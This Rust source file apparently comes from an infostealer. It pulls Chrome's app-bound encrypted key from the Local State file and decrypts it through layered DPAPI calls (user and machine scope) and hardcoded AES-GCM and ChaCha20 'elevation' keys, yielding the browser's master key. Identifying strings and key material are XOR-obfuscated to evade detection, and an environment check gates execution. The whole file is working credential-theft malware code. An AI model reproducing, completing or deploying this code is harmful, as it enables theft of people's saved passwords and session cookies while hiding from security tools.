use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

use super::{env_configured, xor_bytes, xor_str};

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;

const AES_ELEV_KEY_XOR: [u8; 32] = [
    0xE9, 0x46, 0x34, 0x7E, 0x40, 0x92, 0x1C, 0x28, 0xD7, 0xF3, 0x9B, 0xA0, 0x9E, 0xC9, 0x3C,
    0x0B, 0x95, 0xA1, 0xCE, 0x17, 0x4E, 0x60, 0xE2, 0x4C, 0x7D, 0x31, 0x96, 0x37, 0xFA, 0x72,
    0x1D, 0xDD,
];

const CHACHA_ELEV_KEY_XOR: [u8; 32] = [
    0xB3, 0xD5, 0x6D, 0x8D, 0xAE, 0xBB, 0xA0, 0x19, 0x67, 0x43, 0x6A, 0x17, 0x98, 0x7F, 0xDA,
    0x18, 0x53, 0x54, 0x77, 0x47, 0x24, 0xB0, 0x2C, 0x2A, 0x8E, 0x45, 0x29, 0xD7, 0x52, 0x28,
    0xCC, 0x3A,
];

fn aes_elev_key() -> [u8; 32] {
    let decoded = xor_bytes(&AES_ELEV_KEY_XOR);
    decoded.try_into().unwrap_or([0u8; 32])
}

fn chacha_elev_key() -> [u8; 32] {
    let decoded = xor_bytes(&CHACHA_ELEV_KEY_XOR);
    decoded.try_into().unwrap_or([0u8; 32])
}

fn s_os_crypt() -> String {
    xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E])
}

fn s_app_bound_encrypted_key() -> String {
    xor_str(&[
        0x3B, 0x2A, 0x2A, 0x05, 0x38, 0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28,
        0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23,
    ])
}

fn appb_prefix() -> Vec<u8> {
    xor_bytes(&[0x1B, 0x0A, 0x0A, 0x18])
}

fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            flags | CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
        .is_ok()
        {
            let slice =
                std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            let _ = windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(
                output.pbData as *mut _,
            ));
            Some(slice)
        } else {
            None
        }
    }
}

fn normalize_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() == 32 {
        return Some(data.to_vec());
    }
    if data.len() > 32 {
        let tail = &data[data.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    parse_structured_key(data)
}

fn parse_structured_key(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 8 {
        return None;
    }
    let val_len = u32::from_le_bytes(data[0..4].try_into().ok()?) as usize;
    let mut offset = 4 + val_len;
    if data.len() < offset + 4 {
        return None;
    }
    let key_len = u32::from_le_bytes(data[offset..offset + 4].try_into().ok()?) as usize;
    offset += 4;
    if key_len == 32 && data.len() >= offset + 32 {
        return Some(data[offset..offset + 32].to_vec());
    }
    None
}

fn aes_gcm_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    cipher.decrypt(Nonce::from_slice(iv), ciphertext).ok()
}

fn chacha20_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    if iv.len() != 12 || ciphertext.len() < 16 {
        return None;
    }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    let aes_key = aes_elev_key();
    let chacha_key = chacha_elev_key();
    for i in 0..data.len().saturating_sub(61) {
        let flag = data[i];
        if flag != 0x01 && flag != 0x02 {
            continue;
        }
        let iv = &data[i + 1..i + 13];
        let ct_start = i + 13;
        if data.len() < ct_start + 48 {
            continue;
        }
        let ciphertext = &data[ct_start..ct_start + 32];
        let tag = &data[ct_start + 32..ct_start + 48];
        let mut payload = ciphertext.to_vec();
        payload.extend_from_slice(tag);

        let pt = match flag {
            0x01 => aes_gcm_decrypt(&aes_key, iv, &payload),
            0x02 => chacha20_decrypt(&chacha_key, iv, &payload),
            _ => None,
        };
        if let Some(key) = pt.filter(|k| k.len() == 32) {
            return Some(key);
        }
    }
    None
}

fn extract_master_key(data: &[u8]) -> Option<Vec<u8>> {
    normalize_key(data).or_else(|| chrome_inner_decrypt(data))
}

pub fn try_from_local_state(json: &Value) -> Option<Vec<u8>> {
    if !env_configured() {
        return None;
    }

    let key_b64 = json[s_os_crypt()][s_app_bound_encrypted_key()].as_str()?;
    let mut encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    let prefix = appb_prefix();
    if encrypted.starts_with(&prefix) && encrypted.len() > prefix.len() {
        encrypted = encrypted[prefix.len()..].to_vec();
    }

    if let Some(layer) = dpapi_decrypt(&encrypted, 0) {
        if let Some(key) = extract_master_key(&layer) {
            return Some(key);
        }
    }

    if let Some(outer) = dpapi_decrypt(&encrypted, CRYPTPROTECT_LOCAL_MACHINE) {
        if let Some(key) = extract_master_key(&outer) {
            return Some(key);
        }
        if let Some(inner) = dpapi_decrypt(&outer, 0) {
            if let Some(key) = extract_master_key(&inner) {
                return Some(key);
            }
        }
    }

    None
}
